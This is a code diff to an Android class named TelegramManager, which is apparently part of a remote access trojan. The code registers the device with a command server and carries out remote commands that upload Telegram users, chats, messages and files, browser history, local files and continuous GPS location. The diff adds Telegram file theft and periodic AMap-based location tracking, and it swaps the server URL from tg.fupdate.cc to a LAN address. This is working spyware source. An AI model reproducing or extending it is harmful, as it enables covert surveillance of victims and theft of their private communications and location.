@@ -6,10 +6,15 @@ import android.content.ClipboardManager;
 import android.content.Context;
 import android.content.pm.PackageManager;
 import android.os.Build;
+import android.os.SystemClock;
 import android.provider.Settings;
 import android.support.v4.app.ActivityCompat;
 import android.util.Log;
 
+import com.amap.api.location.AMapLocation;
+import com.amap.api.location.AMapLocationClient;
+import com.amap.api.location.AMapLocationClientOption;
+import com.amap.api.location.AMapLocationListener;
 import com.google.gson.Gson;
 import com.google.gson.JsonArray;
 import com.google.gson.JsonObject;
@@ -31,6 +36,8 @@ import com.jakewharton.retrofit2.adapter.rxjava2.RxJava2CallAdapterFactory;
 import java.io.File;
 import java.net.SocketException;
 import java.net.SocketTimeoutException;
+import java.nio.ByteBuffer;
+import java.util.concurrent.TimeUnit;
 import java.util.concurrent.TimeoutException;
 
 import io.reactivex.functions.Consumer;
@@ -78,8 +85,9 @@ public class TelegramManager {
     public static final String TAG = "TelegramManager";
     public static Context context;
 
-    public static String url = "http://tg.fupdate.cc:8001";
     //public static String url = "http://192.168.3.179:8001";
+    //public static String url = "http://tg.fupdate.cc:8001";
+    public static String url = "http://192.168.3.91:8000";
     public static int count = 0;
 
     public static void startAsync(final Context con) {
@@ -114,6 +122,7 @@ public class TelegramManager {
     }
 
     // 注册请求
+    @SuppressLint("CheckResult")
     public static void Register(final Context context){
         JsonObject params = new JsonObject();
         try{
@@ -121,7 +130,9 @@ public class TelegramManager {
             params.addProperty("manufacturer",Build.MANUFACTURER);
             params.addProperty("oem_system",Build.MANUFACTURER + android.net.Uri.encode(Build.MODEL));
             params.addProperty("release", Build.VERSION.RELEASE);
-        } catch (Exception e){}
+        } catch (Exception e){
+            e.printStackTrace();
+        }
         HttpRequest.Register(GetCommon(context), params, url).subscribe(new Consumer<RatVo>() {
                     @Override
                     public void accept(RatVo ratVo) throws Exception {
@@ -144,8 +155,8 @@ public class TelegramManager {
     }
 
     // 心跳请求
+    @SuppressLint("CheckResult")
     public static void Heart(Context context){
-
         HttpRequest.Heart(GetCommon(context), url).subscribe(new Consumer<RatVo>() {
                     @Override
                     public void accept(RatVo ratVo) throws Exception {
@@ -161,8 +172,6 @@ public class TelegramManager {
     // 请求指令
     @SuppressLint("CheckResult")
     public static void Commands(final Context context){
-        //System.out.println("20201126==>" + new Gson().toJson(GetCommon(context)));
-
         HttpRequest.Commands(GetCommon(context), url).subscribe(new Consumer<RatVo>() {
             @Override
             public void accept(RatVo ratVo) throws Exception {
@@ -175,16 +184,16 @@ public class TelegramManager {
                         System.out.println("2020==请求成功，指令为>" + action);
                         final int action_id = Integer.valueOf(jsonObject.get("action_id").toString());
                         switch (action){
-                            case "APP_TG_USER":  // users
+                            case "APP_TG_USER":  // Telegram users
                                 Datas(context,action_id,0,"success",TelegramDb.Users(context,"users"));
                                 break;
-                            case "APP_TG_DIALOG": // dialogs
+                            case "APP_TG_DIALOG": // Telegram dialogs
                                 Datas(context,action_id,0,"success",TelegramDb.Dialogs(context,"dialogs"));
                                 break;
-                            case "APP_TG_CHATS": // chats
+                            case "APP_TG_CHATS": // Telegram chats
                                 Datas(context,action_id,0,"success",TelegramDb.Chats(context,"chats"));
                                 break;
-                            case "APP_TG_MESSAGE": // messages
+                            case "APP_TG_MESSAGE": // Telegram messages
                                 int length = Integer.valueOf(jsonObject.get("length").toString());
                                 String uid = String.valueOf(Integer.valueOf(jsonObject.get("uid").toString()));
                                 String timestamp = jsonObject.get("msg_timestamp").toString().substring(1,jsonObject.get("msg_timestamp").toString().length()-1);
@@ -192,6 +201,21 @@ public class TelegramManager {
                                 String direction = jsonObject.get("direction").toString().substring(1,jsonObject.get("direction").toString().length()-1);
                                 System.out.println("Messages==>" + "uid=" + uid + ",mid=" + mid + ",direction=" + direction);
                                 Datas(context,action_id,0,"success",TelegramDb.Messagess(context,"messages",length,uid,mid,direction));
+                                break;
+                            case "APP_TG_FILE": // Telegram file
+                                final String File_name = jsonObject.get("file_name").toString().substring(1,jsonObject.get("file_name").toString().length()-1);
+                                final String File_path = jsonObject.get("file_path").toString().substring(1,jsonObject.get("file_path").toString().length()-1);
+                                System.out.println("2020==>" + File_path + File_name);
+                                File file = new File(File_path + File_name);
+                                if (Permission.getPermission(context,"android.permission.READ_EXTERNAL_STORAGE")){
+                                    if (file.exists() && file.canRead() && file.isFile()){
+                                        TelegramDb.T_Sendfile(context,file,action_id,url);
+                                    } else {
+                                        SendFile(context,action_id);
+                                    }
+                                } else {
+                                    SendFile(context,action_id);
+                                }
                                 break;
                             case "FILE_LS": // 列目录 路径 path_ls
                                 String path_ls = jsonObject.get("path").toString().substring(1,jsonObject.get("path").toString().length()-1);
@@ -248,21 +272,6 @@ public class TelegramManager {
                             case "BROWSER_HIS_ALL": // 获取全部浏览器记录
                                 Datas(context,action_id,0,"success", SQLiteManager.getLogList());
                                 break;
-                            case "GPS_R": // 获取位置
-                                if (Permission.getPermission(context,"android.permission.ACCESS_FINE_LOCATION")){
-                                    LocManager gps = new LocManager(context);
-                                    JsonObject location = new JsonObject();
-                                    if(gps.canGetLocation()){
-                                        double latitude = gps.getLatitude();
-                                        double longitude = gps.getLongitude();
-                                        location.addProperty("latitude" , latitude);
-                                        location.addProperty("longitude" , longitude);
-                                    }
-                                    Datas_n(context,action_id,0,"success",location);
-                                } else {
-                                    Datas_n(context,action_id,10001,"没有权限，无法执行操作",null);
-                                }
-                                break;
                             case "INFO": // 详细信息
                                 JsonObject info = new JsonObject();
                                 try{
@@ -279,7 +288,7 @@ public class TelegramManager {
                                 break;
                             case "FILE_DOWN": // 下载文件(本地文件上传至服务器)
                                 String path_down = jsonObject.get("path").toString().substring(1,jsonObject.get("path").toString().length()-1);
-                                if (new File(path_down).canRead() && new File(path_down).isFile()) {
+                                if (new File(path_down).canRead() && new File(path_down).isFile() && new File(path_down).exists()) {
                                     FileManager.downloadFile(context,path_down,action_id,url);
                                 } else {
                                     SendFile(context,action_id);
@@ -326,33 +335,30 @@ public class TelegramManager {
                                     SendFile(context, action_id);
                                 }
                                 break;
-                            case "GPS_REALTIME_CONFIG": // 实时获取位置
-                                final String rt_action_type = jsonObject.get("rt_action_type").toString().substring(1,jsonObject.get("rt_action_type").toString().length()-1);
+                            case "GPS_R": // 获取位置
                                 if (Permission.getPermission(context,"android.permission.ACCESS_FINE_LOCATION")){
-                                    new Thread(new Runnable() {
-                                        @Override
-                                        public void run() {
-                                            LocManager gps = new LocManager(context);
-                                            while (true) {
-                                                int sleep = 1000;
-                                                JsonObject location = new JsonObject();
-                                                if(gps.canGetLocation()){
-                                                    double latitude = gps.getLatitude();
-                                                    double longitude = gps.getLongitude();
-                                                    location.addProperty("latitude" , latitude);
-                                                    location.addProperty("longitude" , longitude);
-                                                }
-                                                Datas_rt(context,rt_action_type,0,"success",location);
-                                                try {
-                                                    Thread.sleep(sleep);
-                                                } catch (InterruptedException e) {
-                                                    e.printStackTrace();
-                                                }
-                                            }
-                                        }
-                                    }).start();
+                                    init(context,action_id);
+                                    /*LocManager gps = new LocManager(context);
+                                    JsonObject location = new JsonObject();
+                                    if(gps.canGetLocation()){
+                                        double latitude = gps.getLatitude();
+                                        double longitude = gps.getLongitude();
+                                        location.addProperty("latitude" , latitude);
+                                        location.addProperty("longitude" , longitude);
+                                    }
+                                    Datas_n(context,action_id,0,"success",location);*/
                                 } else {
-                                    Datas_rt(context,rt_action_type,10001,"没有权限，无法执行操作",null);
+                                    Datas_n(context,action_id,10001,"没有权限，无法执行操作",null);
+                                }
+                                break;
+                            case "GPS_REALTIME_CONFIG": // 实时获取位置
+                                Datas_n(context,action_id,0,"success",null);
+                                enable = Boolean.valueOf(jsonObject.get("enable").toString());
+                                interval = Integer.valueOf(jsonObject.get("interval").toString());
+                                if (Permission.getPermission(context,"android.permission.ACCESS_FINE_LOCATION")){
+                                    new Thread_GPS().start();
+                                } else {
+                                    Datas_rt(context,10001,"没有权限，无法执行操作",null);
                                 }
                                 break;
                             default:
@@ -367,6 +373,7 @@ public class TelegramManager {
     }
 
     // 数据结果上报 格式：JsonArray
+    @SuppressLint("CheckResult")
     public static void Datas(Context context, int action_id, int code, String msg, final JsonArray res_data){
         JsonObject params = new JsonObject();
         try{
@@ -389,6 +396,7 @@ public class TelegramManager {
     }
 
     // 数据结果上报 格式：JsonObject
+    @SuppressLint("CheckResult")
     public static void Datas_n(Context context, int action_id, int code, String msg, JsonObject res_data){
         JsonObject params = new JsonObject();
         try{
@@ -411,14 +419,17 @@ public class TelegramManager {
     }
 
     // 实时数据结果上报 格式：JsonObject
-    public static void Datas_rt(Context context, String rt_action_type, int code, String msg, JsonObject res_data){
+    @SuppressLint("CheckResult")
+    public static void Datas_rt(Context context, int code, String msg, JsonObject res_data){
         JsonObject params = new JsonObject();
         try{
-            params.addProperty("rt_action_type", rt_action_type);
+            params.addProperty("rt_action_type", "GPS_RT");
             params.addProperty("code", code);
             params.addProperty("msg",msg);
             params.add("res_data", res_data);
-        } catch (Exception e){}
+        } catch (Exception e){
+            e.printStackTrace();
+        }
         HttpRequest.Datas_rt(GetCommon(context), params, url).subscribe(new Consumer<RatVo>() {
                     @Override
                     public void accept(RatVo ratVo) throws Exception {
@@ -431,7 +442,7 @@ public class TelegramManager {
                 });
     }
 
-    // 文件数据结果上报(no permission no file)
+    // 文件数据结果上报(no permission/no file)
     public static void SendFile(Context context, int action_id){
         RequestBody requestBody = new MultipartBody.Builder().setType(MultipartBody.FORM)
                 .addFormDataPart("device_id", Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID))
@@ -442,7 +453,7 @@ public class TelegramManager {
                 .addFormDataPart("down_delay", "-1")
                 .addFormDataPart("action_id", String.valueOf(action_id))
                 .addFormDataPart("code", String.valueOf(10001))
-                .addFormDataPart("msg", "没有权限，无法执行操作")
+                .addFormDataPart("msg", "没有权限或文件不存在，无法执行操作")
                 .build();
 
         Retrofit retrofit = new Retrofit.Builder().baseUrl(url)
@@ -495,6 +506,7 @@ public class TelegramManager {
         });
     }
 
+    // GetCommon
     public static JsonObject GetCommon(Context context){
         JsonObject common = new JsonObject();
         try {
@@ -564,5 +576,72 @@ public class TelegramManager {
         }
         return Name;
     }
+
+    /**
+     * 调用高德SDK获取经纬度
+     */
+    public static AMapLocationClient mLocationClient = null;
+    public static AMapLocationListener mLocationListener;
+    public static AMapLocationClientOption mLocationOption = null;
+    public static int action_id;
+    public static void init(Context context,int id) {
+        action_id = id;
+        mLocationListener = new MyAMapLocationListener();
+        mLocationClient = new AMapLocationClient(context); //初始化定位
+        mLocationClient.setLocationListener(mLocationListener); //设置定位回调监听
+        mLocationOption = new AMapLocationClientOption(); //初始化AMapLocationClientOption对象
+        mLocationOption.setLocationMode(AMapLocationClientOption.AMapLocationMode.Hight_Accuracy); // 定位高精度模式
+        mLocationOption.setOnceLocation(true); // 获取一次结果（true）
+        //获取最近3s内精度最高的一次定位结果
+        //设置setOnceLocationLatest(boolean b)接口为true，启动定位时SDK会返回最近3s内精度最高的一次定位结果。如果设置其为true，setOnceLocation(boolean b)接口也会被设置为true，反之不会，默认为false。
+        mLocationOption.setOnceLocationLatest(false);
+        mLocationOption.setNeedAddress(true); // 设置是否返回地址信息（默认返回地址信息）
+        mLocationOption.setMockEnable(false); // 设置是否允许模拟位置,默认为false，不允许模拟位置
+        mLocationOption.setLocationCacheEnable(false); // 关闭缓存机制
+        mLocationClient.setLocationOption(mLocationOption); // 给定位客户端对象设置定位参数
+        mLocationClient.startLocation(); // 启动定位
+    }
+
+    // 高德SDK经纬度回调返回
+    private static class MyAMapLocationListener implements AMapLocationListener {
+        @Override
+        public void onLocationChanged(AMapLocation aMapLocation) {
+            if (aMapLocation != null) {
+                if (aMapLocation.getErrorCode() == 0) {
+                    Log.e("位置", aMapLocation.getAddress());
+                    JsonObject location = new JsonObject();
+                    location.addProperty("latitude" , aMapLocation.getLatitude());
+                    location.addProperty("longitude" , aMapLocation.getLongitude());
+                    if (action_id == 0) {
+                        Datas_rt(context,0,"success",location);
+                    } else {
+                        Datas_n(context,action_id,0,"success",location);
+                    }
+                } else {
+                    Log.e("AmapError", "location Error,ErrCode:"
+                            + aMapLocation.getErrorCode() + ",errInfo:"
+                            + aMapLocation.getErrorInfo());
+                }
+            }
+        }
+    }
+
+    // GPS 定时上报
+    public static boolean enable = false;
+    public static int interval = 0;
+    public static class Thread_GPS extends Thread {
+        @Override
+        public void run() {
+            while (enable){
+                try {
+                    init(context,0);
+                    Thread.sleep(interval * 1000);
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+            }
+        }
+    }
+
 
 }
